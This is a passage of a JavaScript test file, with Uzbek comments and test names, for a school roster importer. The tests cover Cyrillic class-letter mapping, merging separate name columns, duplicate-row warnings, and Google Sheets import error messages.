  assert.equal(r('В', K('A', 'B')).letter, 'B', 'forma — kirill klaviatura');
  assert.equal(r('В', K('A', 'V'), 'import').letter, 'V', 'o‘qilishi bo‘yicha (V) — taxmin emas');
  assert.equal(r('Б', K('A', 'B'), 'import').letter, 'B');
  assert.equal(r('А', K('A'), 'import').letter, 'A', 'o‘xshash = o‘qilishi');
  const st = [{ _id: 'IQ-0061', studentId: 'IQ-0061', name: 'Sinov Bkl', grade: 7, classLetter: 'B', lang: 'ru', payStatus: '' }];
  const o = await imp({ students: st }, [['ФИО', 'Класс', 'Язык'], ['Sinov Yangi Vkl', '7-В', 'rus']]);
  assert.equal((o.toWrite || []).length, 0, 'jim 7-B ga qo‘shilmadi');
  assert.ok(o.warnings.some(w => /noaniq \(V yoki B\?\)/.test(w)), JSON.stringify(o.warnings));
});

test('G1-2: alohida «Фамилия | Имя | Отчество» / «Familiya | Ism» — ism birlashtiriladi; aka-ukalar yo‘qolmaydi; fayl ichidagi takror — ogohlantirish', async () => {
  need();
  const c = h => plain(H.impColumns([h, h.map(() => 'x')]));
  const r = c(['№', 'Фамилия', 'Имя', 'Отчество', 'Класс']);
  assert.deepEqual([r.sur, r.first, r.pat, r.cls], [1, 2, 3, 4]);
  assert.equal(c(['Ism, familiya', 'Sinf']).name, 0, 'bitta ustun — to‘liq ism');
  assert.equal(c(['Ism, familiya', 'Sinf']).first, undefined);
  const o = await imp({}, [['№', 'Фамилия', 'Имя', 'Класс'], ['1', 'Sinovov', 'Ivan', '5-А'], ['2', 'Sinovov', 'Pyotr', '5-А']]);
  assert.deepEqual(o.toWrite.map(x => x.data.name), ['Sinovov Ivan', 'Sinovov Pyotr']);
  const o2 = await imp({}, [['Familiya', 'Ismi', 'Sinf'], ['Sinova', 'Laylo', '3-B']]);
  assert.equal(o2.toWrite[0].data.name, 'Sinova Laylo');
  const o3 = await imp({}, [['Ism', 'Sinf'], ['Sinov Takror', '5-A'], ['Sinov Takror', '5-A']]);
  assert.equal(o3.toWrite.length, 1);
  assert.ok(o3.warnings.some(w => /faylda ikkinchi marta/.test(w)), JSON.stringify(o3.warnings));
});

// ---- Google Sheets importi (importFromSheet): server xatolari xabari. Kunlik chegara (ai-assistant/index.cjs 'daily_cap') daqiqa
//   oynasidan ('rate_limited') ALOHIDA — avval doim «Bir daqiqadan so'ng qayta urinib ko'ring» derdi, chegara esa ertagacha turadi.
function sheetEnv(reply) {
  const els = {}, out = { fetched: [] };
  for (const id of ['#modal', '#m-x', '#m-cancel', '#sheet-load', '#sheet-url', '#sheet-msg']) els[id] = { value: '', textContent: '', innerHTML: '', disabled: false, style: {}, onclick: null };
  const ctx = vm.createContext({
    $: s => els[s] || null, openModal: () => {}, closeModal: () => {}, loadAIUrl: async () => 'https://ai.example.org',
    auth: { currentUser: { getIdToken: async () => 'tok-sinov' } },
    fetch: async (u, o) => { out.fetched.push({ u, auth: o && o.headers && o.headers.Authorization }); return { json: async () => reply }; },
    parseCSV: t => t, buildAndPreviewImport: rows => { out.preview = rows; },
  });
  vm.runInContext(fn('importFromSheet') + '\n;this.__imp = importFromSheet;', ctx);
  return { ctx, els, out };
}
async function sheetTry(reply) {
  const E = sheetEnv(reply);
  await E.ctx.__imp();
  E.els['#sheet-url'].value = 'https://docs.google.com/spreadsheets/d/abcSINOV/edit';
  await E.els['#sheet-load'].onclick();
  return { msg: E.els['#sheet-msg'].textContent, btn: E.els['#sheet-load'], out: E.out };
}

test('A7-10 qoldig‘i: Sheets importi — kunlik chegara «ertaga», daqiqa oynasi «bir daqiqadan so‘ng»; tugma qayta yoqiladi', async () => {
  assert.ok(fn('importFromSheet').length > 0, 'importFromSheet topildi');
  const d = await sheetTry({ error: 'daily_cap' });
  assert.equal(d.msg, 'Bugungi import chegarasi tugadi — ertaga qayta urinib ko‘ring.', 'avval: «Bo‘sh javob keldi.» (xato tanilmasdi)');
  assert.deepEqual([d.btn.disabled, d.btn.textContent], [false, 'Yuklab olish']);
  const r = await sheetTry({ error: 'rate_limited' });
  assert.equal(r.msg, 'So‘rovlar juda ko‘p. Bir daqiqadan so‘ng qayta urinib ko‘ring.');
  assert.deepEqual(plain(r.out.fetched), [{ u: 'https://ai.example.org/sheet', auth: 'Bearer tok-sinov' }], 'Direktor tokeni bilan');
  const ok = await sheetTry({ csv: 'Ism,Sinf\nSinov Bola,5\n' });
  assert.equal(ok.out.preview, 'Ism,Sinf\nSinov Bola,5\n', 'CSV oldindan ko‘rishga ketdi');
});
